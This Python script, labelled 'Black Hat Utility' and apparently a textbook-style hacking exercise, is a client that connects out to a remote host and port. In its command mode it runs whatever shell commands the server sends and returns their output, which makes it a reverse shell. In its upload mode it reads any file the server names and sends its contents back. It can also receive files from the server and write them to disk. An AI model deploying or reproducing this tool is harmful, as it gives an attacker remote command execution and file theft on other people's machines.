import argparse
import socket

import sys

import subprocess

import os


def initiate():
    parser = argparse.ArgumentParser(description="some message")
    parser.set_defaults()

    parser.add_argument('-t', '--target', action='store', help='address of target')
    parser.add_argument('-p', '--port', action='store', help='port to use')
    parser.add_argument('-c', '--command', action='store_true', help='initialize a command shell')
    parser.add_argument('-u', '--upload', action='store_true', help='upload files to server')
    parser.add_argument('-d', '--download', action='store_true', help='receive files from server')

    args = parser.parse_args()
    return args


def execute_command(command):
    """
    run command on current machine
    :param command: command to run
    :return: output of the command
    """
    command = command.rstrip()  # trim the new line
    # run shell command and get the output back
    try:
        output = subprocess.check_output(command, stderr=subprocess.STDOUT, shell=True)
    except Exception:
        output = "Failed to execute command. \r\n".encode('utf-8')

    return output


def command_shell(command):
    """
    A thread run by server
    """
    if command[0:2] == "cd":
        try:
            os.chdir(command[3:])
            respond = execute_command("pwd")
        except FileNotFoundError:
            respond = "not such directory"
    else:
        respond = execute_command(command)

    if not len(respond):
        respond = "This command has no output. Current pwd is: ".encode('utf-8') + execute_command("pwd")

    return respond


def connect(target, port, connect_type):
    """
    :param target: target to connect
    :param port: port of target
    :param connect_type: There are three different types of connection: shell_mode, toserver_mode and toclient_mode
    :return:
    """
    client_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    try:
        client_socket.settimeout(10)  # 10s to connect
        client_socket.connect((target, int(port)))
        client_socket.send(connect_type.encode('utf-8'))  # inform the server what type is this connection

        client_socket.settimeout(500)  # if connected, change to 500; awaiting server respond
        print("connected to " + target + ":" + str(port))
        return client_socket
    except socket.timeout:
        print("time out" + "\n" + "connection failed")
        client_socket.close()
        return None


def client_command_loop(target, port):
    client_socket = connect(target, port, "shell_mode")

    """
    get the command from server
    """
    while True:
        command_buffer = ""
        while "\n" not in command_buffer:
            command_buffer += client_socket.recv(1024).decode('utf-8')
        command = command_buffer.strip()
        print("running command: " + str(command))

        respond = command_shell(command)
        client_socket.send(respond)


def client_upload_loop(target, port):
    client_socket = connect(target, port, "toserver_mode")

    """
    get location from server
    """
    while True:
        location_buffer = ""
        while "\n" not in location_buffer:
            location_buffer += client_socket.recv(1024).decode('utf-8')
        location = location_buffer.strip()
        print("uploading file: " + str(location))

        """
        upload the file to server
        """
        try:
            file_descriptor = open(location, "rb")  # read file in byte
            contents = file_descriptor.read()
            file_descriptor.close()
            client_socket.send(contents)
            print("file uploaded")
            print(contents)
        except FileNotFoundError:
            client_socket.send("***".encode('utf-8'))
            print("Failed to upload the file \n Directory does not exist")


def client_receive_loop(target, port):
    client_socket = connect(target, port, "toclient_mode")
    while True:
        recv_len = 1
        raw_data = "".encode('utf-8')
        while recv_len > 0:
            data = client_socket.recv(4096)  # buffer size is 4096
            recv_len = len(data)
            raw_data += data

            if recv_len < 4096:
                break

        try:
            filename_length = int(raw_data[0:3].decode('utf-8'))  # length of filename is 3
            filename = raw_data[3:filename_length+3].decode('utf-8')

            print(filename_length)
            print(filename)
            file_descriptor = open(filename, "wb")  # write the file to current directory
            file_descriptor.write(raw_data[filename_length+3:])
            file_descriptor.close()
            client_socket.send("OK".encode('utf-8'))
        except Exception:
            print("failed to save the file")
            client_socket.send("failed to save the file")


def main():
    """
    TODO: only one action at a time
    :return:
    """
    if not len(sys.argv[1:]):
        print("Black Hat Utility")
        print("use '-h' to print manual")
        return

    args = initiate()

    target = args.target
    port = args.port
    command = args.command
    send_to_server = args.upload
    get_from_server = args.download

    if not port:
        print("missing port")
        return

    if command and send_to_server:  # This need to be fixed
        print("choose either upload or run command")
        return

    elif command:
        client_command_loop(target, port)
    elif send_to_server:
        client_upload_loop(target, port)
    elif get_from_server:
        client_receive_loop(target, port)
    else:
        print("choose from command or upload")


if __name__ == '__main__':
    main()